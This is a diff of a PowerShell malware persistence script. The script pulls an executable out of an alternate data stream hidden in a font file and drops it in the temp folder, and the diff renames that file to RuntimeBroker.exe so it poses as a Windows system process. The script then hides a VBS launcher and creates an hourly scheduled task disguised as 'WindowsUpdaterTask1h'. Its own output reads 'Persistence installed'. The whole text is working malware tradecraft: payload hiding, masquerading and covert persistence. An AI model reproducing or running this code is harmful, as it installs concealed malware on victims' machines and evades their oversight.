@@ -19,7 +19,7 @@ $launcherContent = @"
 `$ProgressPreference = 'SilentlyContinue'
 `$fontFile = '$fontFile'
 `$streamName = '$streamName'
-`$tempAgent = "`$env:TEMP\agent.exe"
+`$tempAgent = "`$env:TEMP\RuntimeBroker.exe"
 if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }
 `$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
 if (`$bytes) {
@@ -40,11 +40,11 @@ Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
 attrib +h $vbsPath
 
 # ---- Scheduled task: every 1 hour ----
-$taskName = "WindowsUpdaterTask1h"   # keep name or change to "WindowsUpdaterTask1h"
+$taskName = "WindowsUpdaterTask1h"
 schtasks /delete /tn $taskName /f 2>$null
 schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it 2>$null
 if ($LASTEXITCODE -eq 0) {
-    Write-Output "✅ Persistence installed (every 1 hour)."
+    Write-Output "✅ Persistence installed (every 1 hour). Agent runs as %TEMP%\RuntimeBroker.exe"
     schtasks /run /tn $taskName 2>$null
 } else {
     Write-Output "❌ Task creation failed."
